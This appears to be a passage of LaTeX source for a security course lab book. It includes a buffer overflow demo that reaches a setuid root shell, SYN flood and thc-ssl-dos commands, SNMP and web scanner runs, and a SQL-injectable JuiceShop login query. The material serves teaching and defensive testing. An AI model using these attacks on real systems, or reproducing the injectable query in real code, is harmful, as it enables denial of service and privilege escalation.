sudo apt-get install gcc-multilib
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
\end{alltt}

Then you can produce 32-bit executables:
\begin{alltt}\footnotesize
// Before:
user@debian-9-lab:~/demo$ file demo
demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
// After - 32-bit
user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
user@debian-9-lab:~/demo$ file demo
demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
\end{alltt}

And layout:
\begin{alltt}\footnotesize
0804a024 B __bss_start
0804a024 b completed.6587
0804a01c D __data_start
0804a01c W data_start
...
080484c0 T the_shell
0804a024 D __TMC_END__
080484eb T __x86.get_pc_thunk.ax
080483a0 T __x86.get_pc_thunk.bx
\end{alltt}


Successful execution would look like this - from a Raspberry Pi:
\begin{alltt}\footnotesize
\$ gcc -o demo demo.c
\$ nm demo | grep the_shell
000104ec T the_shell
\$

...
(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
AAAAAAAAAAAAAAAA
\$
\end{alltt}

Started a new shell.

you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
\begin{alltt}\footnotesize
pi@raspberrypi:~/demo $ gcc -o demo demo.c
pi@raspberrypi:~/demo $ sudo chown root.root demo
pi@raspberrypi:~/demo $ sudo chmod +s demo
pi@raspberrypi:~/demo $ id
uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
AAAAAAAAAAAAAAAA
# id
uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
#

\end{alltt}


\chapter{\faInfoCircle\ SNMP walk 15min}
\label{ex:snmpwalk}

{\bf Objective:}\\
Run SNMP walk on a switch, \verb+snmpwalk+ see information from device.

Lots of basic information helps defenders - AND attackers.

{\bf Purpose:}\\
SNMP is a default management protocol used in almost any network.

{\bf Suggested method:}\\
Run snmpwalk using community string public.
Command is: \verb+snmpwalk -v 2c -c public 10.0.45.x+

%\begin{alltt}
%$
%\end{alltt}

{\bf Hints:}\\
Community strings private and public used to be default for network devices. Today professionel devices have no SNMP configured by default, but lots of networks install the community "public" anyway.

{\bf Solution:}\\
When you have done snmpwalk for at least one device you are done.

{\bf Discussion:}\\
Which part of the information is most relevant to defenders, and attackers.

Also remember on internal LAN segments, use Nmap:
\begin{alltt}
snmp-10.x.y.0.gnmap: nmap -sV -A -p 161 -sU --script=snmp-info -oA snmp-10xy 10.x.y.0/19
snmpscan: nmap -sU -p 161 -oA snmpscan --script=snmp-interfaces -iL targets
\end{alltt}

Metasploit also includes a SNMP auxiliary scanner




\chapter{\faExclamationTriangle\ SSL/TLS scanners 15 min}
\label{ex:sslscan}

{\bf Objective:}\\
Try the Online Qualys SSLLabs scanner \link{https://www.ssllabs.com/}
Try the command line tool sslscan checking servers - can check both HTTPS and non-HTTPS protocols!

SSLscan is available on Kali Linux and Debian

{\bf Purpose:}\\
Learn how to efficiently check TLS settings on remote services.

{\bf Suggested method:}\\
Run the tool against a couple of sites of your choice.

\begin{alltt}\small
root@kali:~# sslscan web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Also run it without options to see the possibilities -- and see if you can find the options to run against SMTPTLS if possible.

{\bf Hints:}\\
Originally sslscan is from \link{http://www.titania.co.uk} but use the version on Kali, install with apt if not installed -- \verb+sudo apt install sslscan+

SMTP TLS is \emph{opportunistic encryption}, if both ends support encryption it will be used. Vulnerable to active man in the middle attacks, but works well in practice.\\
\url{https://en.wikipedia.org/wiki/Opportunistic_encryption}

{\bf Solution:}\\
When you can run and basically understand what the tool does, you are done.

{\bf Discussion:}\\
SSLscan can check your own sites, using hostname or IP while Qualys SSLLabs only can test from hostname

Further SSLscan can be used against multiple database systems and mail systems.

\chapter{\faExclamationTriangle\ Internet scanners 15 min}
\label{ex:web-site-check}

{\bf Objective:}\\
Try the Online scanners \link{https://internet.nl/} and a few more.

{\bf Purpose:}\\
Learn how to efficiently check settings on remote services.

{\bf Suggested method:}\\
There are multiple portals and testing services which allow you to checck a domain,
mail settings or web site. Others exist, feel free to suggest some.

Run tools against a couple of sites of your choice.
\begin{itemize}
\item \url{https://internet.nl/} Generic checker
\item \url{https://www.hardenize.com/} Generic checker
\item \url{https://www.wormly.com/test_ssl} Test TLS
\item \url{https://observatory.mozilla.org/} Web site headers check
\item \url{https://dnsviz.net/} DNS zone check
\item \url{https://rpki.cloudflare.com/} Check RPKI - route validator enter
IP address\\
More information about this: \url{https://labs.ripe.net/author/nathalie_nathalie/rpki-test/}
\end{itemize}



{\bf Hints:}\\
Especially the Mozilla Observatory is usefull for checking web site headers! I use their command line tool, \link{https://github.com/mozilla/observatory-cli}:
\begin{alltt}\small
$ observatory --format report  www.kramse.dk
observatory [WARN] retrying in 1 second (attempt 1/10)
observatory [WARN] retrying in 1 second (attempt 2/10)

HTTP Observatory Report: www.kramse.dk

Score Rule                     Description
    5 content-security-policy  Content Security Policy (CSP) implemented without 'unsafe-inline' or 'unsafe-eval'.
    5 referrer-policy          Referrer-Policy header set to "no-referrer", "same-origin", "strict-origin" or "strict-origin-when-cross-origin".
    5 x-frame-options          X-Frame-Options (XFO) implemented via the CSP frame-ancestors directive.

Score: 115
Grade: A+

Full Report Url: https://observatory.mozilla.org/analyze.html?host=www.kramse.dk
\end{alltt}

{\bf Solution:}\\
When you can run and understand what at least one tool does, you are done.

{\bf Discussion:}\\
Which settings are most important, which settings are your responsebility?



\chapter{\faInfoCircle\ Real Vulnerabilities up to 30min}
\label{ex:real-vulns-exim}

{\bf Objective:}\\
Look at real vulnerabilities. Choose a few real vulnerabilities, prioritize them.

{\bf Purpose:}\\
See that the error types described in the books - are still causing problems.

{\bf Suggested method:}\\
We will use the 2019 Exim errors as starting examples. Download the descriptions from:
\begin{list2}
\item Exim RCE CVE-2019-10149 June\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}

\item Exim RCE CVE-2019-15846 September\\
\url{https://exim.org/static/doc/security/CVE-2019-15846.txt}
\end{list2}

When done with these think about your own dependencies. What software do you depend on? How many vulnerabilities and CVEs are for that? Each year has critical new vulnerabilities, like the 2020 and 2021 shown here.

\begin{list2}
\item CVE-2020 Netlogon Elevation of Privilege \\
\link{https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472}
\item Log4J RCE (CVE-2021-44228) - and follow up like CVE-2021-45046, also look at scanners like:\\
\link{https://github.com/fullhunt/log4j-scan}
\end{list2}

What is CVSS -- Common Vulnerability Scoring System?

I depend on the OpenBSD operating system, and it has flaws too:\\
\url{https://www.openbsd.org/errata65.html}

You may depend on OpenSSH from the OpenBSD project, which has had a few problems too:\\
\url{https://www.openssh.com/security.html}

{\bf Hints:}\\
Remote Code Execution can be caused by various things, but most often some kind of input validation failure.

{\bf Solution:}\\
When you have identified the specific error type, is it buffer overflows? Then you are done.

{\bf Discussion:}\\
How do you feel about running internet services. Lets discuss how we can handle running insecure code.
What other methods can we use to restrict problems caused by similar vulnerabilities.
A new product will often use a generic small computer and framework with security problems.




\chapter{\faExclamationTriangle\ Nikto Web Scanner 15 min}
\label{ex:nikto-webscanner}

{\bf Objective:}\\
Try the program Nikto locally on your workstation


{\bf Purpose:}\\
Running Nikto will allow you to analyse web servers quickly.

\hlkimage{2cm}{nikto.jpg}

\begin{quote}
{\bf Description}
Nikto is an Open Source (GPL) web server scanner which performs
comprehensive tests against web servers for multiple items, including
over 3200 potentially dangerous files/CGIs, versions on over 625
servers, and version specific problems on over 230 servers. Scan items
and plugins are frequently updated and can be automatically updated
(if desired).
\end{quote}

Source: Nikto web server scanner \link{http://cirt.net/nikto2}


\begin{list1}
\item Easy to run, free and quickly reports on static URLs resulting in a interesting response
\item \verb+nikto -host 127.0.0.1 -port 8080+
\item When run with port 443 will check TLS sites
\end{list1}



{\bf Suggested method:}\\
Run the program from your Kali Linux VM

\begin{alltt}
\footnotesize
Script started on Tue Nov  7 17:43:54 2006
$  nikto -host 127.0.0.1 -port 8080 ^M
---------------------------------------------------------------------------
- Nikto 1.35/1.34     -     www.cirt.net
+ Target IP:       127.0.0.1
+ Target Hostname: localhost.pentest.dk
+ Target Port:     8080
+ Start Time:      Tue Nov  7 17:43:59 2006
...
+ /examples/ - Directory indexing enabled, also default JSP examples. (GET)
+ /examples/jsp/snp/snoop.jsp - Displays information about page
retrievals, including other users. (GET)
+ /examples/servlets/index.html - Apache Tomcat default JSP pages
present. (GET)
\end{alltt}
%$

{\bf Hints:}\\
Nikto can find things like a debug.log, example files, cgi-bin directories etc.

If the tool is not available first try: \verb+apt-get install nikto+

Some tools will need to be checked out from Git and run or installed from source.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\


\chapter{\faExclamationTriangle\ Whatweb Scanner 15 min}
\label{ex:whatweb-scanner}

{\bf Objective:}\\
Try the program Whatweb locally on your workstation


{\bf Purpose:}\\
Running Whatweb will allow you to analyse which technologies are used in a web site.

I usually save the command and the common options as a small script:
\begin{alltt}
#! /bin/sh

whatweb -v -a 3 $*
\end{alltt}


{\bf Suggested method:}\\
Run the program from your Kali Linux VM towards a site of you own choice.

\begin{alltt}
user@KaliVM:~$ whatweb -a 3 www.zencurity.com
http://www.zencurity.com [301 Moved Permanently] HTTPServer[nginx], IP[185.129.60.130],
RedirectLocation[https://www.zencurity.com/], Title[301 Moved Permanently], nginx
https://www.zencurity.com/ [200 OK] Email[hlk@zencurity.dk], HTML5, HTTPServer[nginx],
IP[185.129.60.130], Title[Home Page], X-UA-Compatible[IE=edge], nginx
\end{alltt}


{\bf Hints:}\\
If the tool is not available first try: \verb+apt-get install *thetool*+

Some tools will need to be checked out from Git and run or installed from source.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\
How does this tool work?

It tries to fetch common files left or used by specific technologies.




\chapter{\faInfoCircle\ TCP SYN flooding 30min}
\label{ex:syn-flood}

{\bf Objective:}\\
Start a webserver attack using SYN flooding tool hping3.

{\bf Purpose:}\\
See how easy it is to produce packets on a network using hacker programs.

The tool we will use is very flexible and can produce ICMP, UDP and TCP using very few options. This tool is my primary one for doing professsional DDoS testing.

\begin{alltt}\footnotesize
-1 --icmp
       ICMP  mode,  by  default  hping3  will  send  ICMP echo-request, you can set other ICMP
       type/code using --icmptype --icmpcode options.

-2 --udp
       UDP mode, by default hping3 will send udp to target host's port 0.  UDP header  tunable
       options are the following: --baseport, --destport, --keep.
\end{alltt}

TCP mode is default, so no option needed.


{\bf Suggested method:}\\
Connect to the LAB network using Ethernet! Borrow a USB network card if you dont have one.

Start your Kali VM in bridged mode, try a basic TCP flooding attack against the server provided by the instructor, or your own Debian server.

Try doing the most common attacks TCP SYN flood using hping3:

\begin{alltt}
hping3 --flood -p 80 -S 10.0.45.12
\end{alltt}

You should see something like this:
\begin{alltt}\footnotesize
HPING 10.0.45.12: NO FLAGS are set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- 10.0.45.12 hping statistic ---
352339 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
\end{alltt}

You can try different ports with TCP flooding, try port 22/tcp or HTTP(S) port 80/tcp and 443/tcp


{\bf Hints:}\\
The tool we use can do a lot of different things, and you can control the speed. You can measure at the server being attacked or what you are sending, commonly using ifpps or such programs can help.

By changing the speed we can find out how much traffic is needed to bring down a service. This measurement can then be re-checked later and see if improvements really worked.

This allows you to use the tool to test devices and find the breaking point, which is more interesting than if you can overload, because you always can.
\begin{alltt}\footnotesize
-i --interval
       Wait  the  specified  number  of  seconds or micro seconds between sending each packet.
       --interval X set wait to X seconds, --interval uX set wait to X micro seconds.  The de‐
       fault  is  to  wait one second between each packet. Using hping3 to transfer files tune
       this option is really important in order to increase transfer rate. Even  using  hping3
       to  perform  idle/spoofing  scanning  you should tune this option, see HPING3-HOWTO for
       more information.

--fast Alias for -i u10000. Hping will send 10 packets for second.

--faster
       Alias for -i u1. Faster then --fast ;) (but not as fast as your computer can send pack‐
       ets due to the signal-driven design).

--flood
       Sent  packets  as fast as possible, without taking care to show incoming replies.  This
       is ways faster than to specify the -i u0 option.
\end{alltt}

{\bf Solution:}\\
When your team has sent +1 million packets per second into the network, from one or two laptops - you are done.

{\bf Discussion:}\\
Gigabit Ethernet can send up to 1.4 million packets per second, pps.

There is a presentation about DDoS protection with low level technical measures to implement at\\
{\footnotesize \link{https://github.com/kramse/security-courses/tree/master/presentations/network/introduction-ddos-testing}}

Receiving systems, and those en route to the service, should be checked for resources like CPU load, bandwidth, logging. Logging can also overload the logging infrastructure, so take care when configuring this in your own networks.





\chapter{\faInfoCircle\ Nginx as a Transport Layer Security (TLS) endpoint 20 min}
\label{ex:nginx-tls}

{\bf Objective:}\\
Try configuring Nginx with TLS locally on your workstation. This web server can also be used as a TLS end point or reverse proxy. The security track record of this software is quite good. So maybe put this in front of other services.


{\bf Purpose:}\\
Web services with TLS is a requirement in many circumstances. Unfortunately having TLS enabled requires both certificates, settings and large software packages like OpenSSL. A lot of vulnerabilities have been found in these and updating them may prove hard.

Having a centralized entry where TLS is served to the internet may help you.

{\bf Suggested method:}\\
Run the programs from your Debian Linux VM, use \verb+apt install nginx+ if not already installed.

Follow a guide like the one from Nginx:\\
\url{http://nginx.org/en/docs/http/configuring_https_servers.html}

Check using sslscan if your site is working, and configured according to best current practice.

{\bf Hints:}\\
Note: above link does NOT show how to generate certificates and keys, so you need to find this yourself. A good place would be at certificate providers, search for Nginx CSR Certificate Signing Request -- just dont order certificates.

A full blown tutorial from Digital Ocean:\\{\scriptsize
\link{https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-on-debian-10}}

My kramse-labs also includes some example configs, check with \verb+git pull+

{\bf Solution:}\\
When you have configured an instance of Nginx you are done.

{\bf Discussion:}\\
A great document about Transport Layer Security (TLS) is available from the web site of NCSC in the Netherlands:\\
{\scriptsize\url{https://english.ncsc.nl/publications/publications/2021/january/19/it-security-guidelines-for-transport-layer-security-2.1}}

Dont forget to add the recommended HTTP Strict Transport Security header to your configuration, if your site is in production.

{\footnotesize\url{https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html}}

A regular production site could also benefit from Lets Encrypt certificates updated automatically using one of the many clients available. Try searching for Lets Encrypt and Nginx.

\chapter{\faInfoCircle\ Run Nginx as a load balancer -- 20 min}
\label{ex:nginx-loadbalancer}


{\bf Objective:}\\
Run Nginx in a load balancing configuration.

{\bf Purpose:}\\
See an example load balancing tool used for many integration projects, Nginx

{\bf Suggested method:}\\
Running Nginx as a load balancer does not require a lot of configuration.

First goal: Make Nginx listen on two ports by changing the default configuration.

\begin{list2}
\item Start by installing Nginx in your Debian, see it works - open localhost port 80 in browser\\
\verb+apt install nginx+
\item Copy the configuration file! Keep this backup,\\
\verb+cd /etc/nginx/;cp nginx.conf nginx.conf.orig+
\item Add / copy the section for the port 80 server, see below
\item Change \emph{sites} to use port 81 and port 82
\end{list2}


Creating a new site, based on the default site found on Nginx in Debian:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/etc/nginx# cd /etc/nginx/sites-enabled/
root@debian-lab:/etc/nginx/sites-enabled# cp default default2
root@debian-lab:/etc/nginx/sites-enabled# cd /var/www/
root@debian-lab:/var/www# cp -r html html2
\end{minted}

Then edit files \verb+default+ to use port 81/tcp and \verb+default2+ to use port 82/tcp

- also make sure \verb+default2+ uses \verb+root /var/www/html2+

Configuration changes made.

These are the changes you should make:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/etc/nginx/sites-enabled# diff default default2
22,23c22,23
< 	listen 81 default_server;
< 	listen [::]:81 default_server;
---
> 	listen 82 default_server;
> 	listen [::]:82 default_server;
41c41
< 	root /var/www/html;
---
> 	root /var/www/html2;
\end{minted}



Config test and restart of Nginx can be done using stop and start commands:

\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/var/www# nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
root@debian-lab:/var/www# service nginx stop
root@debian-lab:/var/www# service nginx start
\end{minted}

You can now visit \url{http://127.0.0.1:81} and \url{http://127.0.0.1:82}\\
 - which show the same text, but you can change the files in \\
 \verb+/var/www/html+ and \verb+/var/www/html2+

NOTE: also verify that port 80 does \emph{not work} anymore!

Adding the loadbalancer in nginx.conf.

We can now add the two \emph{servers} running into a single loadbalancer with a little configuration:

Add this into \verb+/etc/nginx/nginx.conf+ - inside the section \verb+http { ... }+
\begin{minted}[fontsize=\footnotesize]{shell}
upstream myapp1 {
        server localhost:81;
        server localhost:82;
}
server {
        listen 80;
        location / {
                proxy_pass http://myapp1;
        }
}
\end{minted}

And test using \url{http://127.0.0.1:80}



{\bf Hints:}\\
Make changes to the two sets of HTML files

\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:~# cd /var/www/
root@debian-lab:/var/www# diff html
html/  html2/
root@debian-lab:/var/www# diff html/index.nginx-debian.html html2/index.nginx-debian.html
4c4
< <title>Welcome to nginx!</title>
---
> <title>Welcome to nginx2!</title>
14c14
< <h1>Welcome to nginx!</h1>
---
> <h1>Welcome to nginx2!</h1>
\end{minted}

When reloading the page a few times it will switch between the two versions

My kramse-labs also includes some example configs, check with \verb+git pull+

{\bf Solution:}\\
When you have Nginx running load balanced, then we are good.

{\bf Discussion:}\\
Nginx is also common in cloud environments.

\chapter{\faInfoCircle\ Nginx logging  20 min}
\label{ex:nginx-logging}

{\bf Objective:}\\
See the common log format used by web servers.

\url{https://en.wikipedia.org/wiki/Common_Log_Format}


{\bf Purpose:}\\
Knowing that a common format exist, allow you to choose between multiple log processors.


{\bf Suggested method:}\\
Run Nginx on your Debian Linux VM and then check the logs.


\begin{alltt}
# cd /var/log/nginx
# ls
# less access.log
# less error.log
\end{alltt}


Produce some bad logs using Nikto or using a browser, and check \verb+error.log+


{\bf Hints:}\\
A lot of scanning acctivities would result in error logs, so if you observe a rise in 404 not found or similar, then maybe you are being targetted.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\
I commonly recommend tools like Packetbeat and other tools from Elastic to process logs, see \link{https://www.elastic.co/beats/packetbeat}

Another popular one is Matomo formerly known as Piwik\\
\link{https://matomo.org/}.


\chapter{\faExclamationTriangle\ Nginx filtering 40 min}
\label{ex:nginx-filtering}

{\bf Objective:}\\
See how Nginx can filter a request easily. We won't have tome to go into details about this.


{\bf Purpose:}\\
Running Nginx with a filtering configuration can protect some resource, or part of a web site from attacks.

Example configuration:
\begin{minted}[fontsize=\footnotesize]{shell}
server {
    listen       80;
    server_name  service.dev;
    access_log   /var/log/nginx/access.log;
    error_log    /var/log/nginx/error.log debug;
    # Proxy settings
    proxy_set_header   Host $http_host;
    proxy_redirect     off;
    location / {
        # Catch all
        proxy_pass     http://127.0.0.1:81/;
    }
    location /admin/ {
        # /admin/ only
        allow 192.168.5.0/24;
        deny  all;
        proxy_pass     http://127.0.0.1:81/;
    }
}
\end{minted}

Note; this does a proxy pass to another service locally, you may need to change it. Perhaps you can use the JuiceShop example running on port 3000.

As a directory to disallow, perhaps the \verb+/ftp/+ one.

{\bf Suggested method:}\\
Run the configuration from your Debian Linux VM


{\bf Hints:}\\
My kramse-labs also includes some example configs, check with \verb+git pull+

Having a negative list is bad, better to have a positive list of allowed requests.

{\bf Solution:}\\
When you have tried above and seen Nginx block your request, you are done.

{\bf Discussion:}\\
Multiple modules exist for Nginx, Apache, PHP etc. for blocking bad requests.
Which one is right for your setup, you must research for yourselves.



\chapter{\faExclamationTriangle\ Github secure open source software 15 min}
\label{ex:github-scanning}

\hlkimage{8cm}{software.pdf}

{\bf Objective:}\\
Download the article from Github describing security features available on their platform.


{\bf Purpose:}\\
Running scanners, dependency checking etc. will allow you to analyse the security of your projects.



{\bf Suggested method:}\\
Download and read parts of the article, available as PDF in Fronter, and available at:\\
\url{https://resources.github.com/whitepapers/How-GitHub-secures-open-source-software/}

{\bf Hints:}\\
All languages in use have tools available for helping improve security, in the old days they were called linters after the lint software\\
\url{https://en.wikipedia.org/wiki/Lint_(software)}

{\bf Solution:}\\
When you have downloaded the article and read the first few paragraphs you are done.

Save it for later, as reading it all now will take a long time. Keep it in mind when doing your own projects later.

{\bf Discussion:}\\
There are many scanners for software, docker, platforms, languages etc. Finding the right ones can be hard, and costly. The ones mentioned and used in Github are a nice \emph{bundle} to get started.

There are also many hacker tools on Github. Beware that sometimes you might get more than you wanted, an exploit that hacks your machine!


\chapter{\faInfoCircle\ Identify Session Tokens 30 min}
\label{ex:identify-tokens}

\begin{alltt}\small
Cookie: login=CustomerId=900180&LanguageId=9; OldBrowser=%220%22; Pool=rosalina;
ShowNativeLogin=true; DebugCustomerId=900180; DebugPersonId=400954;
OnboardingCompletedFeatures=h=1c744782963a2478d5db92a9981d401a&ofc_47=True&ofd_49=True;
ASP.NET_SessionId=u0245fara4x3qmkli5refddg;...
\end{alltt}

{\bf Objective:}\\
Look at a real application and identify session tokens.

Verify session settings, like Anti-XSS and Anti-CSRF tokens, if present.

Note: First, look for session tokens, later we may repeat this exercise, with focus on CSRF tokens.

{\bf Purpose:}\\
Web applications are \emph{faking sessions}, each request are independent by design of the protocol. This is done using session cookies and similar methods.

Running Burp while performing a login will allow you to look into session identifiers.

Running a test using Mozilla Observatory first will allow you to analyse the settings for the web site.

Some things to look for
\begin{list2}
\item Cookie settings, Secure Flag and http-only
\item HSTS header \url{https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security}
\item Random -- how to check that?
\end{list2}

If you will be checking multiple sites, I can recommend installing the command line version of Mozilla Observatory
\begin{alltt}\footnotesize
└─$ observatory --format report kea-fronter.itslearning.com                 1 ⨯
observatory [WARN] retrying in 1 second (attempt 1/10)
...
observatory [WARN] retrying in 1 second (attempt 6/10)

HTTP Observatory Report: kea-fronter.itslearning.com

Score Rule                     Description
  -20 content-security-policy  Content Security Policy (CSP) implemented unsafely.
   -5 cookies                  Cookies set without using the Secure flag,
                               but transmission over HTTP prevented by HSTS.
   -5 referrer-policy          Referrer-Policy header set unsafely to "origin",
                               "origin-when-cross-origin", or "unsafe-url".
    5 x-frame-options          X-Frame-Options (XFO) implemented via the CSP frame-ancestors directive.

Score: 70
Grade: B

Full Report Url: https://observatory.mozilla.org/analyze.html?host=kea-fronter.itslearning.com
\end{alltt}

We referenced further scanners in exercise \nameref{ex:web-site-check}
on page \pageref{ex:web-site-check}.

{\bf Suggested method:}\\
Run the Burp program from your Kali Linux VM and login to a site..

{\bf Hints:}\\
Look in the header section, and look for \verb+Cookie:+. Common ones are \verb+ASP.NET_SessionId+ or \verb+PHPSESSID+

{\bf Solution:}\\
When you have identified session cookies and checked the settings using a scanner, test web site or similar you are done. It is recommended though to dive a bit into the application and how these are used.

{\bf Discussion:}\\
Most sites today have switched to using HTTPS, but some are not according to best practice. To prevent the use of credentials or cookies over insecure connections, we should not allow calls to happen over HTTP.

Various tools like OWASP Zap and Burp suite can also be used for analyzing the session cookies, for randomness/entropy:\\
\link{https://portswigger.net/burp/documentation/desktop/tools/sequencer/getting-started}


Checkout the story of the old extension Firesheep on wikipedia, what could happen when session cookies were not protected:\\
\link{https://en.wikipedia.org/wiki/Firesheep}




\chapter{\faInfoCircle\ THC SSL DoS 20 min}
\label{ex:thc-ssl-dos}

{\bf Objective:}\\
Try the program thc-ssl-dos locally on your workstation.


{\bf Purpose:}\\
Running testing tools will allow you to analyse your robustness against various attack types. Best case you will find the bottle-necks before the attackers.


{\bf Suggested method:}\\
Run the program from your Kali Linux VM against my server, as shown below.

\begin{alltt}\footnotesize
$ host www.kramse.org                                                                255 ⨯
www.kramse.org has address 185.129.60.130
www.kramse.org has IPv6 address 2a06:d380:0:101::80

┌──(hkj㉿cornerstone01)-[~]
└─$ thc-ssl-dos --accept 185.129.60.130 443
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

Waiting for script kiddies to piss off................
The force is with those who read the source...
Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
thc-ssl-dos.c:392 SSL_renegotiate() failed
thc-ssl-dos.c:392 SSL_renegotiate() failed
Handshakes 0 [0.00 h/s], 273 Conn, 9 Err
\end{alltt}

{\bf Hints:}\\
There is a description on the kali.org homepage:\\
\link{https://www.kali.org/tools/thc-ssl-dos/}



{\bf Solution:}\\
When you have tried running the tool, you are done.

Discuss with nearby students, would this be a tool you would perhaps use, why or why not.

{\bf Discussion:}\\
THC The Hackers Choice has been producing tools since 1995, their home page is at:\\
\link{https://www.thc.org/}







\chapter{\faInfoCircle\ JuiceShop Login 15 min}
\label{ex:juice-shop-login}

\begin{minted}[fontsize=\footnotesize]{sql}
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}'
AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
{ model: models.User, plain: true })
\end{minted}

{\bf Objective:}\\
Try to find the JuiceShop login box implementation, we know it is vulnerable to SQL injection.


{\bf Purpose:}\\
Seeing bad code is a design pattern -- anti-pattern.


{\bf Suggested method:}\\
Find the source code, look for the database lookups.


{\bf Hints:}\\
The JuiceShop software is open source, and available at github:\\
\link{https://github.com/juice-shop/juice-shop}

Git clone and searching locally might give the best results.

In this case we can search for \verb+SELECT * FROM+, using a simple tool like grep:

\begin{minted}[fontsize=\footnotesize]{shell}
user@Projects:juice-shop$ grep -ril SELECT | egrep -v "test|frontend|static"
...
REFERENCES.md
routes/vulnCodeFixes.ts
routes/search.ts
routes/login.ts // oohhhh looks interesting
routes/countryMapping.ts
routes/vulnCodeSnippet.ts
config/oss.yml
config/mozilla.yml
config/default.yml
README.md
\end{minted}


{\bf Solution:}\\
When you have found examples of the database lookups, you are done. See also discussion below though.


{\bf Discussion:}\\
Think about how this could be changed. How much would it require to change this into prepared statements.
Also having good source code tools help a lot! Finding problems, getting an overview of code etc.






\chapter{\faInfoCircle\ Security.txt 15 min}
\label{ex:security.txt}

{\bf Objective:}\\
Learn how to contact sites with security problems, through \verb+security.txt+ files.



{\bf Purpose:}\\
Contacting a site which has a security problem can be a difficult task. Sending information through the usual support often requires a contract, and you are helping the company?!

Also, how do you make sure people can contact YOUR organisation with security issues in your sites.


\begin{quote}\footnotesize
Summary\\
“When security risks in web services are discovered by independent security researchers who understand the severity of the risk, they often lack the channels to disclose them properly. As a result, security issues may be left unreported. security.txt defines a standard to help organizations define the process for security researchers to disclose security vulnerabilities securely.”


security.txt files have been implemented by Google, Facebook, GitHub, the UK government, and many other organisations. In addition, the UK’s Ministry of Justice, the Cybersecurity and Infrastructure Security Agency (US), the French government, the Italian government, and the Australian Cyber Security Centre endorse the use of security.txt files.
\end{quote}

Source: \link{https://securitytxt.org/}


{\bf Suggested method:}\\
Run the wizard on the site to create a template file for your own purposes.


{\bf Hints:}\\
Looking at other sites can help, since they have run these for some time. So find a few examples, the web site mentions a few.

{\bf Solution:}\\
When you have seen a few security.txt files, and possibly created one yourself, you are done.

{\bf Discussion:}\\
Before this initiative there was a common set of email addresses, used for specific purposes. I still recommend them to customers:

\begin{alltt}\footnotesize
MAILBOX       AREA                USAGE
-----------   ----------------    ---------------------------
ABUSE         Customer Relations  Inappropriate public behaviour
NOC           Network Operations  Network infrastructure
SECURITY      Network Security    Security bulletins or queries
...
MAILBOX       SERVICE             SPECIFICATIONS
-----------   ----------------    ---------------------------
POSTMASTER    SMTP                [RFC821], [RFC822]
HOSTMASTER    DNS                 [RFC1033-RFC1035]
WEBMASTER     HTTP                [RFC 2068]
WWW           HTTP                Synonym for WEBMASTER
\end{alltt}



\end{document}



\chapter{ xx min}
\label{ex:}

{\bf Objective:}\\
Try the program XX locally on your workstation


{\bf Purpose:}\\
Running XXX will allow you to analyse


\begin{alltt}


\end{alltt}


{\bf Suggested method:}\\
Run the program from your Kali Linux VM


{\bf Hints:}\\


{\bf Solution:}\\
When you have

{\bf Discussion:}\\
